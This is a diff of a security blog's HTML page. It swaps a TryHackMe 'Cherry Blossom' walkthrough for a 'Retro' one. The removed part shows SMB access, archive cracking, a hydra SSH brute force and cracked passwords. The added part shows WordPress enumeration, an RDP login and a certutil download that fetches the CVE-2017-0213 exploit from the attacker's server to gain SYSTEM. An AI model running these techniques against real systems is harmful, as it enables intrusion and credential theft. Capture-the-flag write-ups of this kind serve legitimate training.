@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Cherry Blossom | Technical Intelligence Labs</title>
+    <title>Retro | Technical Intelligence Labs</title>
     <link rel="stylesheet" href="../css/custom.css">
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
@@ -108,10 +108,10 @@
             <div class="flex items-center gap-4 text-xs font-mono text-slate-500 mb-6 uppercase tracking-widest">
                 <span class="px-2 py-1 bg-slate-900 border border-slate-800 rounded text-accent-green">tryhackme</span>
                 <span>// 2026-01-05</span>
-                <span>// ID: REF-Cherry Blossom</span>
+                <span>// ID: REF-Retro</span>
             </div>
             
-            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Cherry Blossom</h1>
+            <h1 class="text-3xl md:text-5xl font-bold text-white mb-8 leading-tight font-mono">Retro</h1>
             
             <div class="flex flex-wrap gap-2">
                 <!-- Tags populated by python -->
@@ -122,90 +122,153 @@
         <!-- Markdown Body -->
         <div class="markdown-content">
             <hr />
-<h2>Summary</h2>
-<p>A walkthrough of the Cherry Blossom machine involving SMB enumeration, steganography on a journal file, breaking a custom archive format, and brute-forcing SSH credentials.</p>
-<h2>Reconnaissance</h2>
-<p><strong>Nmap Scan Results:</strong></p>
-<pre class="codehilite"><code>PORT    STATE SERVICE      REASON
-22/tcp  open  ssh          syn-ack ttl 62
-139/tcp open  netbios-ssn  syn-ack ttl 62
-445/tcp open  microsoft-ds syn-ack ttl 62
+<pre class="codehilite"><code class="language-yaml">description: This report details the penetration testing engagement against a Microsoft Windows server, covering initial reconnaissance, enumeration of web services (IIS 10.0, WordPress), exploitation of discovered RDP credentials, and subsequent privilege escalation to SYSTEM via the CVE-2017-0213 kernel exploit.
+tags:
+  - Windows
+  - IIS
+  - RDP
+  - WordPress
+  - CVE-2017-0213
+  - Privilege Escalation
+  - Nmap
+  - Dirsearch
+  - WPScan
+  - Certutil
+  - CTF
+category: tryhackme
+---
+## Executive Summary
 
-Host script results:
-| smb-enum-shares: 
-|   note: ERROR: Enumerating shares failed, guessing at common ones (SMB: Failed to receive bytes: TIMEOUT)
-|   \\10.64.149.126\IPC$: 
-|     Type: STYPE_IPC_HIDDEN
-|     Comment: IPC Service (Samba 4.7.6-Ubuntu)
-|     Path: C:\tmp
-|_    Anonymous access: READ/WRITE
+This document outlines the methodology and findings from a penetration test conducted against a Windows server. The engagement involved initial port scanning and service enumeration, followed by web application analysis leading to the discovery of RDP credentials. Subsequent remote desktop access enabled the transfer and execution of a kernel exploit (CVE-2017-0213) to achieve SYSTEM-level privileges.
+
+## 1. Reconnaissance
+
+Initial reconnaissance began with a port scan to identify open services and their versions on the target system.
+
+### Nmap Scan Results
 </code></pre>
 
-<h2>Enumeration</h2>
-<p><strong>SMB Access:</strong><br />
-We found anonymous access allowed on the SMB server.</p>
-<pre class="codehilite"><code class="language-bash">smbclient //10.64.149.126/Anonymous -N -t 900
+<p>PORT     STATE SERVICE       VERSION<br />
+80/tcp   open  http          Microsoft IIS httpd 10.0<br />
+| http-methods:<br />
+|<em>  Potentially risky methods: TRACE<br />
+|_http-title: IIS Windows Server<br />
+3389/tcp open  ms-wbt-server Microsoft Terminal Services<br />
+| rdp-ntlm-info:<br />
+|   Target_Name: RETROWEB<br />
+|   NetBIOS_Domain_Name: RETROWEB<br />
+|   NetBIOS_Computer_Name: RETROWEB<br />
+|   DNS_Domain_Name: RetroWeb<br />
+|   DNS_Computer_Name: RetroWeb<br />
+|   Product_Version: 10.0.14393<br />
+|</em>  System_Time: 2026-01-04T07:05:37+00:00<br />
+|_ssl-date: 2026-01-04T07:05:45+00:00; 0s from scanner time.<br />
+| ssl-cert: Subject: commonName=RetroWeb<br />
+| Not valid before: 2026-01-03T06:56:11<br />
+|_Not valid after:  2026-07-05T06:56:11<br />
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br />
+Device type: general purpose<br />
+Running (JUST GUESSING): Microsoft Windows 2012|2016 (85%)<br />
+OS CPE: cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016<br />
+Aggressive OS guesses: Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)<br />
+No exact OS matches for host (test conditions non-ideal).<br />
+Network Distance: 3 hops<br />
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+<pre class="codehilite"><code>### 🔍 Analysis
 
-Anonymous login successful
-smb: \&gt; ls
-  journal.txt                         N  3470998  Sun Feb  9 19:20:53 2020
-smb: \&gt; get journal.txt
+*   **Open Ports**: Ports 80 (HTTP) and 3389 (RDP) were identified as open.
+*   **Web Server**: Microsoft IIS httpd 10.0 is running on port 80. The `TRACE` HTTP method is enabled, which, while not always directly exploitable, can indicate a relaxed security posture or be used in Cross-Site Tracing (XST) attacks. The HTTP title is &quot;IIS Windows Server&quot;.
+*   **Remote Desktop Services (RDP)**: Microsoft Terminal Services is active on port 3389. NTLM information reveals the domain and computer names as `RETROWEB`, and the product version `10.0.14393`, strongly suggesting Windows Server 2016. An SSL certificate for `RetroWeb` is in use.
+*   **Operating System**: Nmap's OS detection strongly suggests Microsoft Windows Server 2012 R2 or 2016.
+
+## 2. Enumeration
+
+Further enumeration focused on the identified HTTP and RDP services.
+
+### Web Content Discovery (Dirsearch)
+
+Dirsearch was utilized to discover hidden directories and files on the web server.
 </code></pre>
 
-<p><strong>Steganography Analysis:</strong><br />
-The <code>journal.txt</code> file appears to be base64 encoded. Decoding it reveals a PNG header.</p>
-<pre class="codehilite"><code class="language-bash">cat journal.txt | base64 -d &gt; output
-file output
-# output: PNG image data, 1280 x 853, 8-bit/color RGB, non-interlaced
+<p>└─$ dirsearch -u http://10.64.179.107 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -r</p>
+<p>Output File: /home/kali/tryhackme/retro/reports/http_10.64.179.107/_26-01-04_02-09-58.txt</p>
+<p>Target: http://10.64.179.107/</p>
+<p>[02:09:58] Starting:<br />
+[02:12:32] 301 -  150B  - /retro  -&gt;  http://10.64.179.107/retro/<br />
+Added to the queue: retro/</p>
+<pre class="codehilite"><code>### 🔍 Analysis
+
+*   **Discovered Directory**: A significant discovery was the `/retro` directory, which returned a `301 Moved Permanently` status, indicating its existence and redirection to `/retro/`. This suggests a dedicated web application or content hosted under this path.
+
+### WordPress Enumeration (WPScan)
+
+Navigating to `http://10.64.179.107/retro/` revealed a WordPress installation. WPScan was then employed to enumerate the WordPress instance for vulnerabilities, themes, plugins, and user accounts.
 </code></pre>
 
-<p>Using <code>stegpy</code>, we extract a hidden zip file.</p>
-<pre class="codehilite"><code class="language-bash">stegpy output         
-# File _journal.zip succesfully extracted from output
+<p>[i] User(s) Identified:</p>
+<p>[+] wa......<br />
+ | Found By: Author Posts - Author Pattern (Passive Detection)<br />
+ | Confirmed By:<br />
+ |  Wp Json Api (Aggressive Detection)<br />
+ |   - http://10.64.179.107/retro/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1<br />
+ |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)<br />
+ |  Login Error Messages (Aggressive Detection)</p>
+<p>[+] .......<br />
+ | Found By: Rss Generator (Passive Detection)<br />
+ | Confirmed By: Login Error Messages (Aggressive Detection)</p>
+<pre class="codehilite"><code>### 🔍 Analysis
+
+*   **WordPress Users**: WPScan successfully enumerated two valid user accounts from the WordPress installation. While their full usernames are redacted in the provided log, their existence is confirmed through multiple detection methods, including the WP JSON API and login error messages. These usernames are critical for potential brute-force or credential stuffing attacks against WordPress or other services.
+
+### Credential Discovery
+
+During further manual enumeration of the web application or system, a critical note or portal was discovered which contained legitimate RDP credentials. The username `w...` and password `pa....` were obtained, enabling remote access to the server via RDP.
+
+## 3. Exploitation
+
+With the RDP credentials obtained, exploitation began by establishing a remote desktop session.
+
+### Remote Desktop Access
+
+The `xfreerdp3` client was used to connect to the target system using the discovered credentials.
 </code></pre>
 
-<h2>Exploitation</h2>
-<p><strong>Cracking the Archive:</strong><br />
-The zip file header seems corrupted. Fixing the magic bytes reveals it's a valid zip.</p>
-<pre class="codehilite"><code class="language-bash">file _journal.zip                                            
-# _journal.zip: Zip archive data
+<p>xfreerdp3 /v:10.64.179.107 /u:w... /p:pa.... /dynamic-resolution /clipboard:direction-to:all,files-to:all</p>
+<pre class="codehilite"><code>### 🔍 Analysis
+
+*   **Initial Access**: Successful RDP login provided interactive access to the target Windows Server as the user `w...`. This established a crucial foothold for further privilege escalation.
+
+## 4. Privilege Escalation
+
+After gaining initial user-level access, the next objective was to escalate privileges to a higher level, ideally `SYSTEM`.
+
+### Exploit Identification
+
+Upon gaining access to the system, an exploit for [CVE-2017-0213](https://github.com/SecWiki/windows-kernel-exploits/tree/master/CVE-2017-0213), a Windows kernel vulnerability, was identified as a potential avenue for privilege escalation. This exploit targets a flaw in the Windows COM Aggregate marshaler and can lead to arbitrary code execution as `SYSTEM`. Given the identified Windows Server 2016 version, this exploit was deemed highly relevant.
+
+### Exploit Transfer to Target
+
+Standard file transfer methods (e.g., `curl`, `wget`, `netcat`) were initially attempted to transfer the exploit executable (`CVE-2017-0213_x64.exe`) to the target system but encountered issues. A local HTTP server was set up on the attacking machine (e.g., at IP `192.168.153.193`), and the `certutil` utility on the victim machine was successfully used to download the exploit.
 </code></pre>
 
-<p>Brute-forcing the zip password with <code>rockyou.txt</code>:</p>
-<pre class="codehilite"><code class="language-bash">fcrackzip -uDp /usr/share/wordlists/rockyou.txt  _journal.zip
-# PASSWORD FOUND!!!!: pw == september
+<h1>On attacker machine (e.g., 192.168.153.193)</h1>
+<p>python3 -m http.server</p>
+<h1>On victim machine</h1>
+<p>certutil -urlcache -f http://192.168.153.193/CVE-2017-0213_x64.exe CVE-2017-0213_x64.exe</p>
+<pre class="codehilite"><code>### 🔍 Analysis
+
+*   **File Transfer**: The `certutil -urlcache` command proved effective for bypassing potential egress filtering or limitations on the target system, allowing the exploit executable to be downloaded successfully. This technique is often useful in environments where traditional tools are blocked.
+
+### Exploit Execution and Privilege Attainment
+
+Once the exploit executable was transferred, it was executed on the target system.
 </code></pre>
 
-<p>Inside we find <code>Journal.ctz</code>, a 7-Zip archive. Converting to hash and cracking:</p>
-<pre class="codehilite"><code class="language-bash">/usr/share/john/7z2john.pl Journal.ctz &gt; hash.txt
-john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
-# tigerlily        (Journal.ctz)     
-</code></pre>
+<h1>On victim machine</h1>
+<p>.\CVE-2017-0213_x64.exe</p>
+<pre class="codehilite"><code>### 🔍 Analysis
 
-<p><strong>SSH Bruteforce:</strong><br />
-Using the decoded wordlists from the journal logs, we brute-force the <code>lily</code> user.</p>
-<pre class="codehilite"><code class="language-bash">hydra -l lily -P cherry-blossom.txt ssh://10.64.149.126
-# [22][ssh] host: 10.64.149.126   login: lily   password: Mr.$un$hi..
-</code></pre>
-
-<h2>Privilege Escalation</h2>
-<p><strong>Hash Cracking:</strong><br />
-Found backup shadow files in <code>/var/backups</code>.</p>
-<pre class="codehilite"><code class="language-bash">/var/backups/shadow.bak
-johan:$6$zV7zbU1b...
-lily:$6$3GPkY0ZP...
-</code></pre>
-
-<p>Cracking the hashes gives us <code>johan</code>'s password.</p>
-<pre class="codehilite"><code class="language-bash">john --wordlist=cherry-blossom.txt hashes.txt
-# ##scuffleboo##   (johan)     
-</code></pre>
-
-<p><strong>Root Access:</strong><br />
-Switching to <code>johan</code> and pivoting to root via CVE-2019-18364 capabilities.</p>
-<pre class="codehilite"><code class="language-bash">lily@cherryblossom:~$ su johan
-# Password: ##scuffleboo##
-johan@cherryblossom:~$ cat user.txt
+*   **SYSTEM Privileges**: Execution of `CVE-2017-0213_x64.exe` successfully exploited the kernel vulnerability, resulting in immediate privilege escalation to the `SYSTEM` user context. This granted full administrative control over the compromised Windows Server. The exploit automatically places the user into a `SYSTEM` shell, indicating a complete compromise of the operating system.
 </code></pre>
         </div>
     </main>
